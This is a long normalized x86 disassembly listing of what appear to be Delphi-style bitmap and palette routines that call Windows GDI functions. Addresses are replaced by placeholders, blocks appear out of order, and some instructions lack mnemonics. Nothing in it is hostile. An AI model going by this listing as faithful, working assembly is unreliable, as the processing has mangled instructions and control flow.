call sub_41d500
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5b3
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_41d5a8
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41d5a8
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_4026dc
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd78
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41c9fc
call sub_41bd78
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
push 0x2
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call SetDIBColorTable
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cmp eax [ ebp - 0x80 ]
jne r-xdata
mov eax [ ebp - 0x24 ]
add eax 0x28
push eax
push 0x100
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call GetDIBColorTable
mov edx [ ebp + 0xc ]
mov [ edx + 0x38 ] eax
jmp r-xdata
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call BitBlt
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41bd78
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_41c9fc
call sub_41bd78
push eax
mov eax [ ebp - 0x20 ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
jmp r-xdata
push esi
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_41d5a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x20 ]
push eax
call DeleteDC
retn
push 0xffffffff
push ebx
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
call sub_403a54
call sub_403a54
jmp r-xdata
sub_41f5d5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_41f5e4
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
call sub_4039d0
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
mov eax [ ebp - 0x18 ]
push eax
push 0x0
call ReleaseDC
cmp [ ebp - 0x10 ] 0x0
je r-xdata
retn
mov eax [ ebp + 0xc ]
push eax
push 0x54
mov eax [ ebp - 0x10 ]
push eax
call GetObjectA
sub_41f644
push ebx
push esi
add esp 0xfffffbf8
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
add esp 0x408
pop esi
pop ebx
retn
xor eax eax
mov [ esp ] eax
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov [ esp + 0x4 ] 0x300
mov ax [ esp ]
mov [ esp + 0x6 ] ax
lea eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
lea eax [ esp + 0x4 ]
push eax
call CreatePalette
mov esi eax
sub_41f6a8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x70 ]
push eax
push 0x54
push ebx
call GetObjectA
test eax eax
je r-xdata
mov eax ebx
call sub_41eb9c
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetDC
call sub_41d5a8
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41d5a8
mov [ ebp - 0x10 ] eax
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
call CreateBitmap
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
cmp edi 0x1fffffff
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
call sub_41d5a8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5c ] 0x0
je r-xdata
push 0x42
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call PatBlt
jmp r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
mov [ ebp - 0x11 ] 0x0
mov [ ebp - 0x11 ] 0x1
xor eax eax
mov [ ebp - 0x58 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x0
mov ecx esi
mov edx esi
mov eax ebx
call sub_41efe0
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
mov esi eax
push 0xcc0020
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0x6c ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call BitBlt
push esi
mov eax [ ebp - 0xc ]
push eax
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
push 0x0
push esi
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push ebx
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
test esi esi
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
push ebx
call DeleteObject
sub_41f8b4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41e710
mov [ edi + 0x34 ] 0x20000000
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_41ee0c
cmp [ rw-data ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
test bl bl
je r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_41f91c
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov eax esi
call sub_42002c
mov eax [ esi + 0x28 ]
call sub_41ee10
mov eax [ esi + 0x2c ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413db8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_41f958
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
test ebx ebx
je r-xdata
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_42029c
mov esi ebx
mov eax [ esi + 0x28 ]
call sub_41ee0c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41ee10
mov eax [ esi + 0x28 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov al [ esi + 0x21 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x21 ] al
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413de4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
sub_41fa48
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x5c ]
push ecx
mov ecx 0x15
[ edi ] [ esi ]
pop ecx
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42002c
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41fad7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi [ rw-data ]
jne r-xdata
mov eax esi
call sub_41f644
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax edi
call sub_41efe0
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42029c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_41fadc
mov eax [ ebp - 0x8 ]
call sub_41b4a8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4039d0
call sub_403a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
sub_41fb08
push ebx
mov ebx eax
mov eax ebx
call sub_41fdfc
mov eax [ ebx + 0x28 ]
xor edx edx
mov [ eax + 0x50 ] edx
xor edx edx
mov [ eax + 0x54 ] edx
add eax 0x6c
call sub_40cbf8
pop ebx
retn
sub_41fb38
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
call sub_415504
mov eax [ ebx + 0x28 ]
push esi
lea esi [ eax + 0x18 ]
lea edi [ esp + 0x4 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ esp + 0x14 ] eax
mov eax ebx
call sub_42002c
lea eax [ ebx + 0x2c ]
call sub_40cbf8
push esp
mov eax [ ebx + 0x28 ]
mov al [ eax + 0x70 ]
push eax
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_42029c
add esp 0x54
pop edi
pop esi
pop ebx
retn
sub_41fbac
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x28 ]
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_41d290
mov eax ebx
call sub_42013c
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push 0xc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
push eax
push 0xe
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetDeviceCaps
mov edx eax
pop eax
imul edx
cmp eax 0x8
jg r-xdata
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call RealizePalette
mov [ ebp - 0x9 ] 0x1
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x2a ]
movzx ecx [ esi + 0x28 ]
imul edx ecx
cmp eax edx
jl r-xdata
test al al
je r-xdata
mov al 0x1
mov eax ebx
call sub_41ff38
test al al
jne r-xdata
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call GetBrushOrgEx
push 0x4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetStretchBltMode
lea eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0xd ]
push eax
mov eax [ ebp - 0x11 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SetBrushOrgEx
jmp r-xdata
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
push 0x3
mov eax [ ebp - 0x4 ]
call sub_41d1bc
push eax
call SetStretchBltMode
mov eax ebx
call sub_41fe7c
mov dl [ r-xdata ]
call sub_41d290
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4200dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_41fe7c
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fdef
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_41d5a8
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_41fe7c
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_41d74c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_41fdfc
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_42003c
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_41fa48
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_41d500
sub_41fe7c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_42003c
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ec18
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_41fb08
sub_41fec4
push ebx
mov ebx eax
mov eax ebx
call sub_42002c
mov eax ebx
call sub_42003c
mov edx ebx
mov eax ebx
call sub_41fb08
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_41fee8
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_41ff68
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_41bd78
mov eax ebx
call sub_41ff38
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_41fe7c
xor edx edx
pop ecx
call sub_41d148
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_41ffb8
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_42013c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_41efe0
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_42003c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_4154a0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4200dc
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_42002c
mov eax ebx
call sub_42003c
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_41ff68
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_41f6a8
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_41eb9c
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42013c
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_41dc98
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_41eb9c
push 0x0
call GetDC
call sub_41d5a8
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4201f4
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_41d47c
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_41fa48
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_42002c
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_420278
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_415480
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_42092c
pop esi
pop ebx
retn
sub_42029c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_420323
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_4033e4
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_41ee10
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_41ee0c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42038a
push rw-data
call LeaveCriticalSection
retn
sub_42039c
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_42092c
pop edx
pop edi
pop esi
pop ebx
retn
sub_4203c4
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
